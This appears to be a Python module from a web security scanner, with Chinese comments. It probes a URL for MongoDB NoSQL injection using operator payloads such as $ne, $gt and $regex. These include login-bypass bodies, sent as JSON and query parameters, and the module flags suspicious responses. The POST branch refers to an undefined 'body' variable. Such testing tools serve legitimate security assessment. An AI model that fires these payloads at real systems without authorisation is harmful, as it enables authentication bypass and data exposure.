"""NoSQL 注入检测工具 — MongoDB $ne/$gt 等 Payload"""

from typing import Optional
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from ..client import HttpClient
from ..utils import normalize_url


# NoSQL Injection Payloads
NOSQL_PAYLOADS = [
    # JSON body payloads
    {"payload": '{"$ne": null}', "type": "json", "desc": "$ne null 绕过"},
    {"payload": '{"$ne": ""}', "type": "json", "desc": "$ne 空字符串"},
    {"payload": '{"$gt": ""}', "type": "json", "desc": "$gt 大于空"},
    {"payload": '{"$regex": ".*"}', "type": "json", "desc": "$regex 通配"},
    {"payload": '{"$ne": null, "$gt": ""}', "type": "json", "desc": "$ne + $gt 组合"},
    {"payload": '{"username": {"$ne": null}, "password": {"$ne": null}}', "type": "json", "desc": "登录绕过"},
    # URL query payloads
    {"payload": "id[$ne]=1", "type": "query", "desc": "query $ne"},
    {"payload": "id[$gt]=1", "type": "query", "desc": "query $gt"},
    {"payload": "id[$regex]=.*", "type": "query", "desc": "query $regex"},
    {"payload": "username[$ne]=none&password[$ne]=none", "type": "query", "desc": "query 登录绕过"},
    {"payload": "id[$nin][]=1&id[$nin][]=2", "type": "query", "desc": "query $nin"},
]


async def bb_nosqli(
    url: str,
    params: str = "",
    method: str = "GET",
    proxy: Optional[str] = None,
    cookie: Optional[str] = None,
    auth_token: Optional[str] = None,
    timeout: int = 15,
) -> str:
    """
    NoSQL 注入检测 — MongoDB $ne/$gt/$regex 等 Payload

    Args:
        url: 目标 URL
        params: 参数字段名（逗号分隔），默认自动提取
        method: 请求方法（GET/POST）
        proxy: 代理地址（可选）
        cookie: Cookie（可选）
        auth_token: Bearer Token（可选）
        timeout: 超时秒数（默认 15）

    Returns:
        NoSQL 注入检测结果
    """
    url = normalize_url(url)
    results = []
    results.append(f"[*] NoSQL 注入检测目标: {url}")
    results.append(f"[*] Payload 数: {len(NOSQL_PAYLOADS)}")
    results.append("")

    client = HttpClient(timeout=timeout, proxy=proxy, cookie=cookie, auth_token=auth_token)

    test_params = [p.strip() for p in params.split(",") if p.strip()]
    if not test_params:
        parsed = urlparse(url)
        test_params = list(parse_qs(parsed.query).keys())
    if not test_params:
        test_params = ["id", "username", "password", "email", "token"]

    # 基线
    try:
        if method.upper() == "POST":
            base_resp = await client.post(url, data={"test": "1"})
        else:
            base_resp = await client.get(url)
        base_status = base_resp.status_code
        base_len = len(base_resp.content)
        error_keywords = ["error", "exception", "traceback", "mongodb", "cast", "bson"]
        base_errors = sum(1 for kw in error_keywords if kw in base_resp.text.lower())
    except Exception as e:
        results.append(f"[!] 基线请求失败: {e}")
        return "\n".join(results)

    findings = []

    for param in test_params[:5]:  # 最多测 5 个参数
        for entry in NOSQL_PAYLOADS:
            payload = entry["payload"]
            ptype = entry["type"]
            pdesc = entry["desc"]

            try:
                if ptype == "query" or method.upper() == "GET":
                    # 直接拼接到 URL
                    if "=" in payload:
                        new_url = url.rstrip("?&") + ("&" if "?" in url else "?") + payload
                    else:
                        new_url = url.rstrip("?&") + ("&" if "?" in url else "?") + f"{param}={payload}"
                    resp = await client.get(new_url)
                else:
                    # JSON body
                    try:
                        import json
                        _json_body = json.loads(payload)
                    except json.JSONDecodeError:
                        _json_body = {param: payload}
                    # NoSQL JSON payload 用 json_data, 用户传入的 body 用 data
                    if body:
                        resp = await client.post(url, data=body,
                                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
                    else:
                        resp = await client.post(url, json_data=_json_body,
                                                 headers={"Content-Type": "application/json"})

                indicators = []
                body_text = resp.text.lower()

                # 状态码变化
                if resp.status_code == 200 and base_status in (401, 403):
                    indicators.append(f"认证绕过: {base_status} → 200")
                elif resp.status_code != base_status:
                    indicators.append(f"状态码变化: {base_status} → {resp.status_code}")

                # 错误信息
                if any(kw in body_text for kw in error_keywords):
                    indicators.append("数据库错误信息")

                # 响应大小变化
                len_diff = abs(len(resp.content) - base_len)
                if len_diff > 200 and base_len > 0:
                    indicators.append(f"响应大小变化 ({base_len} → {len(resp.content)})")

                if indicators:
                    findings.append({
                        "param": param,
                        "payload": payload,
                        "type": pdesc,
                        "status": resp.status_code,
                        "indicators": indicators,
                    })
            except Exception:
                pass

    if not findings:
        results.append("[-] 未检测到 NoSQL 注入")
        results.append("")
        results.append("[*] 手动验证:")
        results.append('  GET  /api/user?id[$ne]=1')
        results.append('  POST /api/login  {"username": {"$ne": null}, "password": {"$ne": null}}')
    else:
        results.append(f"[!] 发现 {len(findings)} 个可疑 NoSQL 注入点:")
        results.append("")
        for f in findings[:10]:
            results.append(f"  参数: {f['param']}")
            results.append(f"  类型: {f['type']}")
            results.append(f"  Payload: {f['payload']}")
            results.append(f"  状态: HTTP {f['status']}")
            results.append(f"  指标: {'; '.join(f['indicators'])}")
            results.append("")

    return "\n".join(results)
